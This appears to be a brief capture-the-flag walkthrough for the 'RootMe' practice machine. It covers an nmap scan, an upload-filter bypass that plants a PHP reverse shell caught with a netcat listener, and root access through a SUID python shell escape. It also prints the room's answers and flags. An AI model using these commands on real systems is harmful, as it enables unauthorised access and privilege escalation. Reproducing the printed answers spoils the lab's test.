# RootMe

```
export IP=10.10.29.94
```
## Nmap scan
nmap -v -sC -sV -oN scans/initial $IP
```
Nmap scan report for 10.10.29.151
Host is up (0.060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Task 2

### Scan the machine, how many ports are open?

R:2

### What version of Apache is running?

R:2.4.29

### What service is running on port 22?

R:ssh

### What is the hidden directory?

R:/panel/

## Task 3

Go to hidden directory /panel/

netcat -vv -n -l -p 1234

upload file php_reverse_shell.phtml on $IP/panel

cat ./var/www/user.txt 

Flag: THM{y0u_g0t_a_sh3ll}

## Task 4

### Search for files with SUID permission, which file is weird?

find / -user root -perm /4000

R: /usr/bin/python

### root.txt

python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’

find / -type f -name root.txt

cat /root/root.txt

OR python -c 'print(open("/root/root.txt").read())'

R: THM{pr1v1l3g3_3sc4l4t10n}